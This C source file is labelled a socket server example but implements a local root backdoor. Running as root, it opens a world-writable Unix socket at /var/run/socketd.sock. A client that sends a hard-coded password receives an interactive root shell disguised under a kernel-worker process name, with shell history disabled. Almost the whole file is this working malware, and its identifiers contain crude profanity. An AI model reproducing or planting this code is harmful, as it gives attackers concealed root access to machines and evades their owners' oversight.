/* http://www.binarytides.com/server-client-example-c-sockets-linux/
	C socket server example
*/
 
#include <stdio.h>
#include <string.h>    //strlen
#include <sys/socket.h>
#include <arpa/inet.h> //inet_addr
#include <unistd.h>    //write
#include <stdlib.h>

// socket
#include <stddef.h>
#include <errno.h>
#include <sys/un.h>

// fork
#include <sys/types.h>
#include <sys/wait.h>

// chmod
#include <sys/stat.h>

// http://www.gnu.org/software/libc/manual/html_node/Local-Socket-Example.html#Local-Socket-Example
int
make_named_socket (const char *filename)
{
  struct sockaddr_un name;
  int sock;
  size_t size;

  /* Create the socket. */
  sock = socket(PF_LOCAL, SOCK_STREAM, 0);
  if (sock < 0)
	{
	  perror ("socket");
	  exit (EXIT_FAILURE);
	}

  /* Bind a name to the socket. */
  name.sun_family = AF_LOCAL;
  strncpy (name.sun_path, filename, sizeof (name.sun_path));
  name.sun_path[sizeof (name.sun_path) - 1] = '\0';

  /* The size of the address is
	 the offset of the start of the filename,
	 plus its length (not including the terminating null byte).
	 Alternatively you can just do:
	 size = SUN_LEN (&name);
 */
  size = (offsetof (struct sockaddr_un, sun_path)
		  + strlen (name.sun_path));

  if (bind (sock, (struct sockaddr *) &name, size) < 0)
	{
	  perror ("make_named_socket(): bind()");
	  exit (EXIT_FAILURE);
	}

  return sock;
}


void fuck(int client_sock)
{
	if (client_sock < 0){
		printf("fuck(): client_sock: is %d\n", client_sock);
		perror("accept failed");
		exit(1);
	}

	int read_size;
	char client_message[2000];
	FILE *fp;
	char path[256];
	char *pass = "knock knock m0therfucker";
	
	setsid();
	dup2(client_sock, STDIN_FILENO);
	dup2(client_sock, STDOUT_FILENO);
	dup2(client_sock, STDERR_FILENO);

	while((read_size = recv(client_sock, client_message, 2000, 0)) > 0)
	{
		strtok(client_message, "\n");
		if (! strcmp(pass, client_message)) {
			printf("[READY] uid=%d gid=%d\n", getuid(), getgid());
			setuid(0);
			setgid(0);
			char const *args[] = { "[kworker/0:1]", "-i", NULL };
			char const *env[]  = { "HISTFILE=/dev/null", "SAVEHIST=",
			                       "PS1=\n[$(whoami)@$(hostname)]:$(pwd)\\$ ",
			                       "LANG=en_US.UTF-8", NULL };
			execve("/bin/sh", (char **)args, (char **)env);
		}
	}
	if(read_size == 0)
	{
		puts("Client disconnected");
		fflush(stdout);
	}
	else if(read_size == -1)
	{
		perror("recv failed");
		exit(1);
	}
	printf("closing client sock: %d: bye bye", client_sock);
	close(client_sock);
	exit(0);
}

int main(int argc , char *argv[])
{
	setuid(0);
	setgid(0);
	int socket_desc;
	int c = sizeof(struct sockaddr_un);
	char *sockname = "/var/run/socketd.sock";
	unlink(sockname);

	int server = make_named_socket(sockname);
	chmod(sockname, 00666);

	if (listen(server, 3) != 0) {
		perror("listen");
		exit(1);
	}

	while (1+1 == 2)
	{
		int pid;
		int newfd = dup(3);


		printf("main():      server: is %d\n", server);
		printf("main():       newfd: is %d\n", newfd);
		int client_sock = accept(newfd, (struct sockaddr *)&newfd, (socklen_t *)&c);
		printf("main(): client_sock: is %d\n", client_sock);

		if((pid = fork()) == -1){
			perror("fork failed");
			return 1;
			continue;
		}
		else if (pid == 0){
			fuck(client_sock);
			break;
		}
		else{
			int status;
			printf("main(): had a baby called: pid %d\n", pid);
			//close(client_sock);
/*			
			(void)waitpid(pid, &status, 0);
			printf("main(): child’s status: is %d\n", status);
			if (status != 0) {
				perror("main(): waitpid");
				return status;
			}
*/
		}
	}


	close(server);
	unlink(sockname);
	return 0;
}